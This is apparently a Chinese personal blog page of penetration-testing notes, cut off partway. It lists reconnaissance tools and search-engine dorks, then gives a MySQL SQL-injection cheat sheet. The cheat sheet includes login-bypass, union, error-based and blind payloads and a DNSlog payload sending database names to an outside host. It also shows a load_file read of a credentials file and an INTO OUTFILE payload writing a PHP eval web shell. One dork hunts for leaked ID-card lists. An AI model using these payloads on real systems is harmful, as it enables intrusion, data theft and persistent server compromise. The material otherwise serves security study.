<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="✨星星之火，可以燎原🔥" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="✨星星之火，可以燎原🔥" type="application/atom+xml"><link rel="alternate" type="application/json" title="✨星星之火，可以燎原🔥" href="https://chxpro.me/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-4OIRAUH5.js"></link><link rel="modulepreload" href="/js/copy-tex-Z6RTXIR7.js"></link><link rel="modulepreload" href="/js/post-YZDP36J6.js"></link><link rel="modulepreload" href="/js/chunk-K726QPC2.js"></link><link rel="modulepreload" href="/js/search-2VYYTE37.js"></link><link rel="modulepreload" href="/js/chunk-7SU4IW4N.js"></link><link rel="modulepreload" href="/js/index.esm-5QAC4QGI.js"></link><link rel="modulepreload" href="/js/chunk-WSHI2ZUL.js"></link><link rel="modulepreload" href="/js/chunk-4TXMXQ2G.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="https://t.alcy.cc/moez?500847" as="image" fetchpriority="high"><link rel="preload" href="https://t.alcy.cc/moez?806365" as="image" fetchpriority="high"><link rel="preload" href="https://t.alcy.cc/moez?359377" as="image" fetchpriority="high"><link rel="preload" href="https://t.alcy.cc/moez?836036" as="image" fetchpriority="high"><link rel="preload" href="https://t.alcy.cc/moez?442630" as="image" fetchpriority="high"><link rel="preload" href="https://t.alcy.cc/moez?982724" as="image" fetchpriority="high"><meta name="keywords" content="辰海星,星星"/><meta name="description" content="NPC也有悲惨的剧情"/><link rel="canonical" href="https://chxpro.me/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.html"><script>window.sakuraConfig = {
  sakura: 30,
  xSpeed: 0.5,
  ySpeed: 0.5,
  rSpeed: 0.03,
  direction: "TopRight",
  zIndex: -1
};</script><script src="https://cdn.jsdelivr.net/gh/minz71/sakura-rain/sakura-rain.js" defer="defer"></script><link rel="stylesheet" href="/css/post.css?v=0.5.0"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.0"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>渗透笔记</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">渗透笔记</h1><div class="meta"><span class="item" title="创建时间：2024-12-18 21:52:42"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2024-12-18T21:52:42+08:00">2024-12-18</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>28k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>25 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">STAR✨WORLD</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;https://t.alcy.cc/moez?500847&quot;);"></li><li class="item" style="background-image: url(&quot;https://t.alcy.cc/moez?806365&quot;);"></li><li class="item" style="background-image: url(&quot;https://t.alcy.cc/moez?359377&quot;);"></li><li class="item" style="background-image: url(&quot;https://t.alcy.cc/moez?836036&quot;);"></li><li class="item" style="background-image: url(&quot;https://t.alcy.cc/moez?442630&quot;);"></li><li class="item" style="background-image: url(&quot;https://t.alcy.cc/moez?982724&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="item" rel="index" title="分类于渗透"><span itemprop="name">渗透<meta itemprop="position" content="0"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://chxpro.me/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.html"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpeg"/><meta itemprop="name" content="辰海星"/><meta itemprop="description" content=", NPC也有悲惨的剧情"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="✨星星之火，可以燎原🔥"/></span><div class="body md" itemprop="articleBody"><h2 id="确定目标"><a class="anchor" href="#确定目标">#</a> 确定目标</h2>
<ul>
<li><span class="label info">域名</span> ——<span class="label info">IP</span>——<span class="label info"> 公司名称</span> ——<span class="label info"> 小程序</span> ——<span class="label info"> 公众号</span> ——<span class="label info"> 自媒体账号</span> ——<span class="label info">app</span></li>
</ul>
<h2 id="信息收集"><a class="anchor" href="#信息收集">#</a> 信息收集</h2>
<details class="info"><summary>漏扫工具</summary><div>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/adysec/ARL">灯塔</a>（在更）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/ki9mu/ARL-plus-docker">灯塔魔改</a>（2024 年 10 月 11 日）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/jasonxtn/Argus">Argus</a>（kali 安装）（2024 年 10 月 18 日）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">fscan</a>（在更）</li>
<li><a target="_blank" rel="noopener" href="https://gobies.org/">Goby</a>（windows 收费）</li>
<li>AppScan</li>
<li>Nessus</li>
<li>OpenVAS</li>
</ul>
</div></details>
<details class="info"><summary>企业信息</summary><div>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/wgpsec/ENScan_GO">enscan</a>（2024 年 12 月 24 日）</li>
</ul>
</div></details>
<details class="info"><summary>域名</summary><div>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/mhtsec/ip2domain">ip2domain</a>（在更）<a target="_blank" rel="noopener" href="https://linux.do/t/topic/399944">linuxdo 作者</a></li>
</ul>
</div></details>
<details class="info"><summary>子域名</summary><div>
<ul>
<li>网站
<ul>
<li><a target="_blank" rel="noopener" href="https://www.dnsgrep.cn/">DNSGrep</a></li>
</ul>
</li>
<li>工具
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/0x727/ShuiZe_0x727">水泽</a>（2021 年 8 月 3 日）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">OneForAll</a>（2022 年 7 月 10 日）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/knownsec/ksubdomain">ksubdomain</a>（2021 年 1 月 12 日）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/euphrat1ca/LayerDomainFinder">layer 子域名挖掘机</a>（2019 年 7 月 17 日）</li>
</ul>
</li>
</ul>
</div></details>
<details class="info"><summary>域名证书(ICP备案)</summary><div>
<ul>
<li><a target="_blank" rel="noopener" href="https://crt.sh">crt</a></li>
</ul>
</div></details>
<details class="info"><summary>IP</summary><div>
<ul>
<li><a target="_blank" rel="noopener" href="https://ip138.com/">IP138</a></li>
<li><a target="_blank" rel="noopener" href="https://www.itdog.cn">ITdog</a></li>
<li><a target="_blank" rel="noopener" href="https://ping.chinaz.com/">站长之家</a></li>
<li><a target="_blank" rel="noopener" href="https://zhale.me">zhale.me</a></li>
<li><a target="_blank" rel="noopener" href="https://ipchaxun.com/">IP 查询</a></li>
</ul>
</div></details>
<details class="info"><summary>端口</summary><div>
<ul>
<li>工具
<ul>
<li><a target="_blank" rel="noopener" href="https://nmap.org/download">Nmap</a>（在更）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/robertdavidgraham/masscan">masscan</a>（2021 年 1 月 31 日）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/redtoolskobe/scaninfo">scaninfo</a>（2021 年 11 月 5 日）</li>
</ul>
</li>
</ul>
</div></details>
<details class="info"><summary>CDN</summary><div>
<ul>
<li>国外有可能有真实 IP 地址</li>
<li>ping 子域名可能在该 IP</li>
<li>网站
<ul>
<li><a target="_blank" rel="noopener" href="http://myssl.com/">mySSL 证书检测</a></li>
</ul>
</li>
</ul>
</div></details>
<details class="info"><summary>指纹</summary><div>
<ul>
<li>
<p>特征</p>
<ul>
<li>响应头</li>
<li>浏览器插件
<ul>
<li><a target="_blank" rel="noopener" href="https://www.wappalyzer.com">wappalyzer</a></li>
</ul>
</li>
<li>网站
<ul>
<li><a target="_blank" rel="noopener" href="https://www.yunsee.cn">云悉指纹</a></li>
<li><a target="_blank" rel="noopener" href="http://finger.tidesec.net/">潮汐指纹</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p>CMS</p>
<ul>
<li>网站
<ul>
<li><a target="_blank" rel="noopener" href="https://whatcms.org/">whatcms</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p>工具</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/urbanadventurer/WhatWeb">WhatWeb</a> kali 自带（2021 年 1 月 15 日）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/EHole">棱洞 EHole3.0</a>（2023 年 6 月 14 日）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/TideSec/TideFinger">python 潮汐指纹</a></li>
</ul>
</li>
</ul>
</div></details>
<details class="info"><summary>目录扫描</summary><div>
<ul>
<li>御剑 2</li>
<li>robots.txt</li>
<li><a target="_blank" rel="noopener" href="https://github.com/7kbstorm/7kbscan-WebPathBrute">WebPathBrute</a>（2020 年 2 月 5 日）</li>
<li>DirBuster（kali）（2018 年 4 月 11 日）</li>
<li>dirb（kali）</li>
<li><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a>（在更 - 2022 年 10 月 5 日）</li>
</ul>
</div></details>
<details class="info"><summary>框架漏洞</summary><div>
<ul>
<li>spring
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/wyzxxz/heapdump_tool">heapdump_tool</a></li>
</ul>
</li>
</ul>
</div></details>
<details class="info"><summary>APP</summary><div>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/kelvinBen/AppInfoScanner">AppInfoSannner</a></li>
</ul>
</div></details>
<details class="info"><summary>旁站 C段</summary><div>
</div></details>
<details class="info"><summary>WAF</summary><div>
<ul>
<li>
<p>检测方式</p>
<ul>
<li>空间测绘</li>
</ul>
</li>
<li>
<p>工具</p>
<ul>
<li>
<p>Heimdallr （停止维护 - 2024 年 1 月 4 日）</p>
</li>
<li>
<p>WAF（kali）</p>
</li>
</ul>
</li>
</ul>
</div></details>
<details class="info"><summary>泄露接口</summary><div>
<ul>
<li>swagger-ui</li>
</ul>
</div></details>
<details class="info"><summary>敏感信息</summary><div>
<ul>
<li>社交，视频，网盘，搜索引擎，GitHub，语雀，平台上的账号密码</li>
</ul>
</div></details>
<details class="info"><summary>源代码</summary><div>
<ul>
<li>三合一：<a target="_blank" rel="noopener" href="https://github.com/0xHJK/dumpall">dumpall</a></li>
<li>网站备份 bak zip tar</li>
</ul>
</div></details>
<details class="info"><summary>DNSlog</summary><div>
<ul>
<li><a target="_blank" rel="noopener" href="https://eyes.sh/login">https://eyes.sh/login</a></li>
</ul>
</div></details>
<h2 id="搜索语法"><a class="anchor" href="#搜索语法">#</a> 搜索语法</h2>
<h3 id="google"><a class="anchor" href="#google">#</a> Google</h3>
<table>
<thead>
<tr>
<th style="text-align:center">语法</th>
<th style="text-align:center">含义</th>
<th style="text-align:center">示例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">OR（必须大写）</td>
<td style="text-align:center">有其中一个关键字</td>
<td style="text-align:center">通缉犯 OR 悬赏</td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td style="text-align:center">排除相关关键字</td>
<td style="text-align:center">小米 - 手机 -Mi</td>
</tr>
<tr>
<td style="text-align:center">“ ”</td>
<td style="text-align:center">严格按关键字搜索</td>
<td style="text-align:center">“小米”</td>
</tr>
<tr>
<td style="text-align:center">intitle:</td>
<td style="text-align:center">包含标题有关键字</td>
<td style="text-align:center">intitle: 后台登录 intitle:index of</td>
</tr>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:center">任意一个字符</td>
<td style="text-align:center">inurl:*.baidu.com</td>
</tr>
<tr>
<td style="text-align:center">site:</td>
<td style="text-align:center">限定域名来自于关键字</td>
<td style="text-align:center">site:zhihu.com</td>
</tr>
<tr>
<td style="text-align:center">inurl:</td>
<td style="text-align:center">url 中有关键字</td>
<td style="text-align:center">inurl:login</td>
</tr>
<tr>
<td style="text-align:center">intext:</td>
<td style="text-align:center">内容包含关键字</td>
<td style="text-align:center">intext: 星星</td>
</tr>
<tr>
<td style="text-align:center">filetype:</td>
<td style="text-align:center">包含文件类型</td>
<td style="text-align:center">intitle:&quot;身份证&quot; &amp;&amp;&quot;清单&quot; | &quot;名单&quot; filetype:pdf</td>
</tr>
<tr>
<td style="text-align:center">link</td>
<td style="text-align:center">包含链接</td>
<td style="text-align:center">link:baidu.com</td>
</tr>
</tbody>
</table>
<h3 id="空间测绘fofa"><a class="anchor" href="#空间测绘fofa">#</a> 空间测绘 (fofa)</h3>
<table>
<thead>
<tr>
<th>关键字</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>domain</td>
<td>domain=&quot;<a target="_blank" rel="noopener" href="http://xxx.cn">xxx.cn</a>&quot;&amp;&amp; (title=&quot; 管理 &quot;)</td>
</tr>
<tr>
<td>title</td>
<td>title=&quot;管理&quot;</td>
</tr>
<tr>
<td>protocol</td>
<td>domain=&quot;<a target="_blank" rel="noopener" href="http://enn.cn">enn.cn</a>&quot; &amp;&amp; (protocol=&quot;ftp&quot; ll protocol=&quot;mysql&quot; )</td>
</tr>
<tr>
<td>body</td>
<td>body=“xxx”&amp;&amp; (title=&quot;管理&quot;)</td>
</tr>
<tr>
<td>app</td>
<td>domain=&quot;<a target="_blank" rel="noopener" href="http://enn.cn">enn.cn</a>&quot;&amp;&amp; (app=&quot; 管理 &quot;)</td>
</tr>
</tbody>
</table>
<h2 id="sql注入mysql"><a class="anchor" href="#sql注入mysql">#</a> SQL 注入（mysql）</h2>
<h3 id="查询数据"><a class="anchor" href="#查询数据">#</a> 查询数据</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token string">' or 1=1 --			##万能查询注入sql</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>'</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1			##删除sql注入</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>show warning		##查看报错</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>Insert into users(uid,username,password,isadmin)</pre></td></tr><tr><td data-num="8"></td><td><pre>Values(1,'</span><span class="token operator">&lt;</span>scipts javascript<span class="token operator">></span>cracker<span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span>G0<span class="token operator">&lt;</span><span class="token operator">/</span>scripts<span class="token operator">></span><span class="token string">''</span>hs123<span class="token string">' 1)		##后门思路</pre></td></tr><tr><td data-num="9"></td><td><pre>                  </pre></td></tr><tr><td data-num="10"></td><td><pre>show cloumns from users;		##显示字段</pre></td></tr><tr><td data-num="11"></td><td><pre>show create table users;		##显示字段</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>Select * from users where uid in (select uid from admin)；  ##两表查相同数据</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>select * from users union select * from admin;				##两表全查</pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>select * from user where uid = 11079 union select 1,2,user() ,database(),@@datadir;	##获取数据库名称，数据库路径，数据库用户</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>and ！！！2=2		##用多重不等于判断</pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>"<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">--+			## 判断闭合方式</span></pre></td></tr></table></figure><h3 id="权限控制"><a class="anchor" href="#权限控制">#</a> 权限控制</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">grant</span> <span class="token keyword">all</span> <span class="token keyword">privileges</span> <span class="token keyword">on</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">to</span> admin<span class="token variable">@'%'</span> identified <span class="token keyword">by</span> <span class="token string">'admin.123'</span>		<span class="token comment">## 创建用户密码并允许所有 IP 访问所有数据库</span></pre></td></tr></table></figure><h3 id="重点表"><a class="anchor" href="#重点表">#</a> 重点表</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token punctuation">.</span><span class="token keyword">user</span>	host<span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">,</span>authentication_string		<span class="token comment">## 数据库用户信息</span></pre></td></tr><tr><td data-num="2"></td><td><pre>	 <span class="token punctuation">.</span>db			<span class="token comment">## 存放数据权限表单</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	 <span class="token punctuation">.</span>columns_priv		<span class="token comment">## 字段权限表</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>infomation_schema<span class="token punctuation">.</span>chemata		<span class="token comment">## 保存当前系统中所有数据库信息</span></pre></td></tr><tr><td data-num="6"></td><td><pre>				 <span class="token punctuation">.</span><span class="token keyword">tables</span>		<span class="token comment">## 表的信息</span></pre></td></tr><tr><td data-num="7"></td><td><pre>				 <span class="token punctuation">.</span><span class="token keyword">columns</span>		<span class="token comment">## 字段</span></pre></td></tr></table></figure><h3 id="数据库函数"><a class="anchor" href="#数据库函数">#</a> 数据库函数</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>version<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">## 数据库版本</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment">## 数据库用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">## 数据库名称</span></pre></td></tr><tr><td data-num="4"></td><td><pre>@<span class="token variable">@datadir</span><span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">## 数据库路径</span></pre></td></tr><tr><td data-num="5"></td><td><pre>length<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">## 长度</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'general%'</span><span class="token punctuation">;</span> 	<span class="token comment">## 查看 mysql 日志存放路径</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">set</span> <span class="token keyword">global</span> general log <span class="token operator">=</span><span class="token string">"ON"</span><span class="token punctuation">;</span>		<span class="token comment">## 开启 mysql 日志</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">set</span> globalgeneral log fle<span class="token operator">-</span><span class="token string">"D:\phpstudy pro\wwwshell.php"</span><span class="token punctuation">;</span>		<span class="token comment">## 设置 mysql 日志目录</span></pre></td></tr></table></figure><h3 id="联合注入"><a class="anchor" href="#联合注入">#</a> 联合注入</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>concat<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">## 没有分隔符的连接字符串</span></pre></td></tr><tr><td data-num="2"></td><td><pre>group_concat<span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment">## 多个数据在一行取出</span></pre></td></tr><tr><td data-num="3"></td><td><pre>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment">## 随机函数</span></pre></td></tr><tr><td data-num="4"></td><td><pre>floor<span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment">## 取整函数</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment">## 汇总函数</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">group</span> <span class="token keyword">by</span> clause	<span class="token comment">## 分组语句</span></pre></td></tr></table></figure><h3 id="报错注入"><a class="anchor" href="#报错注入">#</a> 报错注入</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>EXTRACTVALUE<span class="token punctuation">(</span>xxx<span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 		<span class="token comment">##xml 查询爆破，第二个参数可控</span></pre></td></tr><tr><td data-num="2"></td><td><pre>updatexml<span class="token punctuation">(</span>xxx<span class="token punctuation">,</span>payload<span class="token punctuation">,</span>xxx<span class="token punctuation">)</span><span class="token comment">--+	## 同上</span></pre></td></tr><tr><td data-num="3"></td><td><pre>ST_LatFromGeoHash<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>ST_Pointfromgeohash<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>GTID<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>exp<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="盲注"><a class="anchor" href="#盲注">#</a> 盲注</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token punctuation">)</span>			<span class="token comment">## 取最左边的字符		select left (database ()，1)='s'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>substring<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">## 取字符串任意长度的字符</span></pre></td></tr><tr><td data-num="3"></td><td><pre>position<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment">## 取集中的位置</span></pre></td></tr></table></figure><h3 id="注入语句示例"><a class="anchor" href="#注入语句示例">#</a> 注入语句示例</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' or 1=1 --+ # %23						##简单注入</pre></td></tr><tr><td data-num="2"></td><td><pre>?id=1 order by 3</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>?id=1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment">## 简单联合注入</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+			##联合注入查表</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>?id=1'</span> <span class="token operator">and</span> <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">117</span> <span class="token comment">--+ ## 盲注</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(1=1, sleep(5), null)  --+		##时间盲注</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>?id=1'</span> <span class="token operator">or</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">--+	## 报错注入</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">## 请求头注入</span></pre></td></tr><tr><td data-num="15"></td><td><pre>先在数据库中插入payload再进行注入	<span class="token comment">## 二次注入</span></pre></td></tr><tr><td data-num="16"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,loadfile(concat('</span><span class="token comment">//',(select database()),'.m0bkps2j.eyes.sh/abc')),3 --+</span></pre></td></tr><tr><td data-num="17"></td><td><pre>									<span class="token comment">##DNSLOG 注入，前提 secure_file_priv = 为空，服务器为 Windows</span></pre></td></tr><tr><td data-num="18"></td><td><pre>									</pre></td></tr><tr><td data-num="19"></td><td><pre>kobe<span class="token operator">%</span>df<span class="token string">'+or+1=1#  ##宽字节注入</pre></td></tr><tr><td data-num="20"></td><td><pre>?id=-1'</span>  <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'C:/phpstudy_pro/WWW/sqli/sql-connections/db-creds.inc'</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">23</span>					<span class="token comment">##sql 查文件，前提 secure_file_priv = 为空</span></pre></td></tr><tr><td data-num="21"></td><td><pre>?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'  union select 1,2,'</span><span class="token operator">&lt;</span>?php </pre></td></tr><tr><td data-num="22"></td><td><pre>eval<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string">'</pre></td></tr><tr><td data-num="23"></td><td><pre> into outfile '</span>C:<span class="token operator">/</span>phpstudy_pro<span class="token operator">/</span>WWW<span class="token operator">/</span>sqli<span class="token operator">/</span><span class="token keyword">sql</span><span class="token operator">-</span>connections<span class="token operator">/</span><span class="token number">1.</span>php' <span class="token operator">%</span><span class="token number">23</span></pre></td></tr><tr><td data-num="24"></td><td><pre>										<span class="token comment">##sql 写文件，前提 secure_file_priv = 为空</span></pre></td></tr></table></figure><h2 